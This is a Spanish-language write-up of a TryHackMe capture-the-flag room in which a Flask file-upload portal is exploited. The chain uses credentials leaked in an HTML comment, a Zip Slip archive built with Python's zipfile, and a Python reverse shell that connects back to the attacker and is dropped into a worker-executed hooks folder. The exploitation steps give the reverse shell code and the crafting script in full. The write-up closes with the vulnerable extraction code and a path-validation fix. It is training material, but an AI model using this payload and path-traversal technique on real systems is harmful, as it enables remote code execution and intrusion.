---
title: "The Hollow Shell"
date: 2026-08-05 17:30:00 -0400
description: "Explotación de un portal Flask de subida de archivos mediante Zip Slip para lograr escritura arbitraria en el sistema de archivos y obtener RCE a través de un worker automatizado."
categories: [TryHackMe, Hacker Holidays 2026]
tags: [web, zip-slip, rce, flask, python, information-disclosure, medium]
---

> 📌 **Ficha Técnica**
>
> * **Plataforma:** TryHackMe
> * **Evento/Sala:** Hacker Holidays 2026 — The Hollow Shell
> * **Dificultad:** Media
> * **Categoría:** Web
> * **Técnicas Clave:** Information Disclosure (comentario HTML), Zip Slip (path traversal en extracción de archivos), RCE vía worker automatizado, Reverse Shell en Python

---

## Descripción del reto

El briefing de la sala presenta a *Byte Lotus*, un hotel ficticio con un portal interno para que el personal suba "shells" — paquetes `.zip` con ambientación sonora de playa para las pantallas de las habitaciones:

> *"Slip past what the portal forgets to check, and the shell answers with a shell of your own."*

Leyendo el texto con atención, ya se pueden identificar los vectores antes de tocar la máquina:

- **"Upload a shell"** → funcionalidad de subida de archivos comprimidos.
- **"Slip past what the portal forgets to check"** → el portal no valida algo durante la extracción del zip.
- **"The shell answers with a shell of your own"** → el objetivo es conseguir RCE.

La cadena de ataque completa es: `Zip Slip → escritura arbitraria de archivos → carpeta vigilada por worker → ejecución automática → reverse shell`.

---

## Reconocimiento

### Escaneo de puertos

```bash
nmap -sC -sV --min-rate 5000 <TARGET_IP>
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18
5000/tcp open  http    gunicorn
```

> El servicio web **no está en el puerto 80** sino en el **5000**. La presencia de `gunicorn` confirma que es una aplicación Python — casi con toda seguridad Flask.
{: .prompt-info }

Navegando a `http://<IP>:5000` la app redirige automáticamente a `/login`, confirmando que existe un panel de autenticación.

---

## Análisis de la aplicación

### Information Disclosure — credenciales en el código fuente

Al revisar el código fuente del login con `Ctrl+U` aparece un comentario HTML que el equipo de IT dejó sin eliminar:

```html
<!--
  Byte Lotus // internal display-manager portal
  New on the floor team? IT seeds every property with the same
  starter login until you set your own:
      user: concierge
      pass: StayNoticed2024!
  (rotate it from Settings on first sign-in — most people forget)
-->
```

> Antes de buscar vulnerabilidades complejas, siempre revisa el código fuente de las páginas con `Ctrl+U`. Los comentarios HTML son uno de los lugares más frecuentes de fuga de información sensible.
{: .prompt-tip }

Con las credenciales `concierge / StayNoticed2024!` accedemos al dashboard.

### Análisis del dashboard

El panel de staff expone dos funcionalidades:

1. **Subida de shells:** acepta un `.zip` que debe contener un `shell.json` (manifiesto con lista de assets). Tipos de asset permitidos: `png jpg gif svg css json`.
2. **Listado de shells activos:** muestra nombre e ID de cada shell subido.

Una nota al pie del formulario de subida contiene la pista más importante del reto:

> *"A shell may include optional **automation hooks** — the theme worker applies these for you shortly after the shell comes ashore, so you don't have to touch each tablet by hand."*

Esto revela dos cosas críticas:
- Existe un **proceso en segundo plano** (theme worker) que procesa las shells automáticamente, con un pequeño delay tras la subida.
- Hay un mecanismo de **hooks** que ese worker "aplica" — si podemos escribir en la carpeta que vigila, podemos ejecutar código.

### Comportamiento base — zip válido

Antes de explotar, verificamos el flujo normal. Creamos un zip mínimo válido:

```json
{
  "name": "test-shell",
  "assets": ["beach.css"]
}
```

```bash
# Obtener cookie de sesión primero
curl -s -X POST http://<IP>:5000/login \
  -d "username=concierge&password=StayNoticed2024!" \
  -c cookies.txt

# Subir el zip
curl -s -b cookies.txt \
  -F "shell=@test-shell.zip" \
  http://<IP>:5000/upload
```

El shell aparece en el dashboard con un ID único y sus archivos son accesibles directamente:

```
GET /shells/<id>/shell.json   → 200 OK
GET /shells/<id>/beach.css    → 200 OK
```

---

## Explotación

### Paso 1 — Confirmar Zip Slip

Zip Slip es una vulnerabilidad de path traversal que se produce durante la **extracción** de archivos comprimidos. Si el servidor no valida que los nombres de las entradas del zip permanezcan dentro del directorio de destino, un atacante puede escribir archivos en rutas arbitrarias del filesystem.

> El comando `zip` estándar normaliza las rutas y elimina los `../` automáticamente. Para crear entradas con path traversal hay que usar la librería `zipfile` de Python directamente, que no aplica ninguna sanitización.
{: .prompt-warning }

Creamos un zip de prueba que intenta escribir fuera del directorio de extracción, apuntando a `/static/` (carpeta servida por HTTP, lo que nos permite verificar el resultado):

```python
import json, zipfile

manifest = {"name": "zipslip-confirm", "assets": []}

with zipfile.ZipFile("confirm.zip", "w") as z:
    z.writestr("shell.json", json.dumps(manifest))
    z.writestr("../../static/zipslip_confirm.txt", "ZIP_SLIP_CONFIRMED")
```

```bash
python3 build_confirm.py
curl -s -b cookies.txt -F "shell=@confirm.zip" http://<IP>:5000/upload
curl -s http://<IP>:5000/static/zipslip_confirm.txt
```

Respuesta: `ZIP_SLIP_CONFIRMED`

**Zip Slip confirmado.** El servidor usa `extractall()` sin validación de rutas, lo que nos permite escribir en cualquier ruta relativa al directorio de la aplicación.

### Paso 2 — Identificar el objetivo: directorio `/hooks/`

Con escritura arbitraria de archivos en el servidor, el siguiente paso es encontrar dónde escribir para conseguir ejecución de código. La pista está en el propio texto del dashboard:

- El portal menciona explícitamente **"automation hooks"**.
- El "theme worker" procesa las shells **automáticamente** poco después de la subida.
- La estructura de archivos de la app (con carpetas `shells/` y `static/`) sugiere que podría existir una carpeta hermana llamada `hooks/`.

La hipótesis es que `/hooks/` es una carpeta del filesystem (no una ruta HTTP) que el worker vigila y ejecuta automáticamente cualquier script `.py` nuevo que aparezca. El nombre es una inferencia directa del lenguaje del reto.

### Paso 3 — Preparar el reverse shell

> En fish shell **no existe soporte para heredocs** (`<< EOF`). Para crear el archivo de payload hay que usar Python directamente.
{: .prompt-warning }

```bash
# Crear el archivo de payload limpio con Python (sin indentación extra)
python3 -c "
payload = '''import socket, os, pty
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((\"<TU_IP_TUN0>\", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
pty.spawn(\"/bin/bash\")
'''
with open('callback.py', 'w') as f:
    f.write(payload)
"
```

> Si el payload Python se genera desde un bloque multilínea con indentación (dentro de un `if` o función), el archivo resultante heredará esos espacios. Cuando el worker intente ejecutarlo, fallará con `IndentationError`. La forma correcta es escribir el payload a un archivo separado sin indentación y luego leerlo.
{: .prompt-warning }

Verificamos que el archivo quedó limpio, con cada línea en la columna 0:

```bash
cat callback.py
```

```python
import socket, os, pty
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("<TU_IP_TUN0>", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
pty.spawn("/bin/bash")
```

### Paso 4 — Armar el zip malicioso

```python
import json, zipfile

manifest = {"name": "shoreline-update", "assets": []}

with open("callback.py") as f:
    payload = f.read()

with zipfile.ZipFile("hook-rce.zip", "w") as z:
    z.writestr("shell.json", json.dumps(manifest))
    z.writestr("../../hooks/callback.py", payload)
```

Verificamos que las entradas del zip quedaron correctas antes de subir:

```bash
unzip -l hook-rce.zip
```

```
Archive:  hook-rce.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
       42  08-05-2026 17:22   shell.json
      205  08-05-2026 17:22   ../../hooks/callback.py
---------                     -------
      247                     2 files
```

### Paso 5 — Ejecutar

En una terminal aparte, levantamos el listener:

```bash
nc -lvnp 4444
```

Subimos el zip y esperamos unos segundos (el worker tiene un pequeño delay):

```bash
curl -s -b cookies.txt \
  -F "shell=@hook-rce.zip" \
  http://<IP>:5000/upload
```

La conexión llega:

```
Ncat: Connection from <IP>:55430.
roomservice@tryhackme-2404:/var/www/conch$
```

---

## Captura de la flag

```bash
cd /home/roomservice
cat flag.txt
```

```
THM{z1p_sl1pp3d_1nt0_a_sh3ll}
```

---

## Análisis técnico de las vulnerabilidades

### Zip Slip

Zip Slip se produce cuando un servidor extrae un archivo comprimido sin validar que cada entrada permanezca dentro del directorio de destino. El patrón vulnerable en Python es:

```python
# VULNERABLE — no hay validación de rutas
import zipfile

with zipfile.ZipFile("upload.zip") as z:
    z.extractall("/var/www/app/shells/")
```

`extractall()` respeta los `../` en los nombres de entrada y escribe fuera del destino. La corrección correcta usa `os.path.realpath` para verificar que la ruta resuelta siga dentro del directorio esperado:

```python
# SEGURO
import zipfile, os

DEST = "/var/www/app/shells/"

with zipfile.ZipFile("upload.zip") as z:
    for entry in z.namelist():
        target = os.path.realpath(os.path.join(DEST, entry))
        if not target.startswith(os.path.realpath(DEST)):
            raise ValueError(f"Zip Slip detectado: {entry}")
    z.extractall(DEST)
```

### Worker con ejecución automática no restringida

El "theme worker" ejecuta automáticamente cualquier archivo `.py` que aparezca en `/hooks/`. Sin una allowlist de scripts autorizados ni verificación de integridad (firma HMAC, por ejemplo), cualquier archivo que llegue a esa carpeta — incluso vía Zip Slip — se convierte en ejecución de código arbitrario con los privilegios del worker.

---

## Resumen de la cadena de ataque

| # | Paso | Técnica | Resultado |
|---|------|---------|-----------|
| 1 | Reconocimiento | nmap | Puerto 5000, Flask/gunicorn |
| 2 | Information Disclosure | Comentario HTML | Credenciales `concierge / StayNoticed2024!` |
| 3 | Análisis del dashboard | Revisión del texto del portal | Identificación del mecanismo de hooks y worker |
| 4 | Prueba de concepto | Zip Slip a `/static/` | Escritura arbitraria de archivos confirmada |
| 5 | Explotación | Zip Slip a `/hooks/callback.py` | RCE como `roomservice` |
| 6 | Flag | `cat /home/roomservice/flag.txt` | `THM{z1p_sl1pp3d_1nt0_a_sh3ll}` |

---

## Conclusión / Retroalimentación

**Aprendizajes clave:**

- **Siempre lee el código fuente de las páginas.** Las credenciales en comentarios HTML son un hallazgo sorprendentemente frecuente en aplicaciones reales. `Ctrl+U` es el primer paso después de cargar cualquier página.

- **Zip Slip no requiere herramientas especiales.** La librería estándar `zipfile` de Python es suficiente para armar el zip malicioso. Lo importante es entender por qué el comando `zip` del sistema no sirve: normaliza rutas automáticamente.

- **Las pistas del texto del reto son literales.** "Automation hooks" y "theme worker" describían exactamente los componentes del sistema. Leer la descripción con mentalidad técnica (¿qué implementación real hay detrás de estas palabras?) es una habilidad tan importante como saber usar herramientas.

- **Escritura arbitraria ≠ RCE automático.** Tener Zip Slip solo significa que puedes escribir archivos. El RCE dependió de que el worker ejecutara automáticamente lo que cayera en `/hooks/`. Identificar ese vector fue el razonamiento más importante del reto.

- **fish shell tiene diferencias importantes con bash.** Los heredocs (`<< EOF`) no están soportados. Para crear archivos de texto multi-línea en fish, lo más robusto es delegar en `python3 -c "..."`.

**Feedback general de la sala:**

Una sala bien construida con una narrativa coherente que conecta el lore (hotel de playa, conchas de mar) con los conceptos técnicos (zip slip, shell). La vulnerabilidad es real y relevante — Zip Slip afectó a decenas de librerías populares en 2018 y versiones similares siguen apareciendo en auditorías de código hoy. El "theme worker" como mecanismo de ejecución es un vector creativo que obliga al jugador a pensar más allá de "subir un archivo PHP" y razonar sobre la arquitectura del sistema. Recomendada para quienes quieran trabajar path traversal en contexto de file upload sin depender de extensiones de archivo como vector principal.
